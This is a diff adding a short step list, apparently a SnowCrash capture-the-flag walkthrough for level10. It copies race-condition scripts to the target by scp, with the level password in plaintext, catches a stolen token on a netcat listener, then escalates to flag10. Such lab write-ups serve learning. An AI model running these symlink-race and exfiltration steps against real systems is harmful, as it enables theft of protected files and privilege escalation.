@@ -1,0 +1,11 @@
+[host]
+scp -P 4242 exec_loop.sh level10@192.168.1.16:/tmp/exec_loop.sh		(s5cAJpM8ev6XHw998pRWG728z)
+scp -P 4242 link_loop.sh level10@192.168.1.16:/tmp/link_loop.sh		(s5cAJpM8ev6XHw998pRWG728z)
+./nc_loop.sh
+
+[snowcrash]
+/tmp/./link_loop.sh
+/tmp/./exec_loop.sh
+CHECK NC LISTENER ON HOST FOR TOKEN
+su flag10
+getflag
